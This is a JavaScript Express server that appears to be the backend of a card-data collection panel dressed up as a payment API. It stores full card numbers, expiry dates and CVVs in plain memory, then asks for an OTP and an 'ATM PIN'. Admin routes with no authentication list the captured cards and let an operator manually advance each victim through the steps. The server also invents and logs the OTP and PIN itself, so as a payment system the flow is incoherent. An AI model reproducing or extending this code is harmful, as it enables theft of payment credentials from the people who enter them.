import express from 'express';
import cors from 'cors';

const app = express();
const PORT = 3001;

// In-memory storage for payments
const payments = new Map();

// Helper to generate OTP
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Helper to generate unique ID
function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// Middleware
app.use(express.json());

// CORS middleware with proper headers
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  
  next();
});

app.use(cors());

// ========== PAYMENT API ROUTES ==========

// Submit card details
app.post('/api/payment/submit-card', (req, res) => {
  try {
    const { cardNumber, cardHolder, expiryDate, cvv, email } = req.body;

    if (!cardNumber || !cardHolder || !expiryDate || !cvv || !email) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const paymentId = generateId();
    const otp = generateOTP();

    const payment = {
      id: paymentId,
      email,
      cardNumber,
      cardHolder,
      expiryDate,
      cvv,
      status: 'pending_card',
      otp,
      createdAt: new Date().toISOString(),
    };

    payments.set(paymentId, payment);

    console.log(`[PAYMENT] Card submitted for ${email}. OTP: ${otp}`);

    res.json({
      success: true,
      paymentId,
      message: 'Card details received. Awaiting admin approval.',
    });
  } catch (error) {
    console.error('Error submitting card:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Verify OTP
app.post('/api/payment/verify-otp', (req, res) => {
  try {
    const { otp, email } = req.body;

    if (!otp || !email) {
      return res.status(400).json({ error: 'Missing OTP or email' });
    }

    // Find payment by email
    let payment = undefined;
    payments.forEach((p) => {
      if (p.email === email && p.status === 'pending_otp') {
        payment = p;
      }
    });

    if (!payment) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    if (payment.otp !== otp) {
      return res.status(400).json({ error: 'Invalid OTP' });
    }

    payment.status = 'pending_pin';
    payment.pin = Math.floor(1000 + Math.random() * 9000).toString();

    console.log(`[PAYMENT] OTP verified for ${email}. PIN: ${payment.pin}`);

    res.json({
      success: true,
      message: 'OTP verified. Please enter your ATM PIN.',
    });
  } catch (error) {
    console.error('Error verifying OTP:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Verify PIN
app.post('/api/payment/verify-pin', (req, res) => {
  try {
    const { pin, email } = req.body;

    if (!pin || !email) {
      return res.status(400).json({ error: 'Missing PIN or email' });
    }

    // Find payment by email
    let payment = undefined;
    payments.forEach((p) => {
      if (p.email === email && p.status === 'pending_pin') {
        payment = p;
      }
    });

    if (!payment) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    if (payment.pin !== pin) {
      return res.status(400).json({ error: 'Invalid PIN' });
    }

    payment.status = 'completed';

    console.log(`[PAYMENT] PIN verified for ${email}. Payment completed!`);

    res.json({
      success: true,
      message: 'Payment completed successfully!',
    });
  } catch (error) {
    console.error('Error verifying PIN:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ========== ADMIN API ROUTES ==========

// Get all pending payments
app.get('/api/admin/payments', (req, res) => {
  try {
    const allPayments = Array.from(payments.values())
      .filter(p => p.status !== 'completed' && p.status !== 'rejected')
      .map(p => ({
        id: p.id,
        email: p.email,
        cardNumber: p.cardNumber,
        cardHolder: p.cardHolder,
        status: p.status,
        createdAt: p.createdAt,
      }));

    res.json(allPayments);
  } catch (error) {
    console.error('Error fetching payments:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Approve payment (move to next step)
app.post('/api/admin/payments/:id/approve', (req, res) => {
  try {
    const { id } = req.params;
    const payment = payments.get(id);

    if (!payment) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    if (payment.status === 'pending_card') {
      payment.status = 'pending_otp';
      console.log(`[ADMIN] Card approved for ${payment.email}`);
    } else if (payment.status === 'pending_otp') {
      payment.status = 'pending_pin';
      console.log(`[ADMIN] OTP approved for ${payment.email}`);
    } else if (payment.status === 'pending_pin') {
      payment.status = 'completed';
      console.log(`[ADMIN] PIN approved for ${payment.email}`);
    }

    res.json({
      success: true,
      message: 'Payment approved and moved to next step.',
    });
  } catch (error) {
    console.error('Error approving payment:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Reject payment
app.post('/api/admin/payments/:id/reject', (req, res) => {
  try {
    const { id } = req.params;
    const payment = payments.get(id);

    if (!payment) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    payment.status = 'rejected';
    console.log(`[ADMIN] Payment rejected for ${payment.email}`);

    res.json({
      success: true,
      message: 'Payment rejected.',
    });
  } catch (error) {
    console.error('Error rejecting payment:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`API Server running on http://localhost:${PORT}`);
});
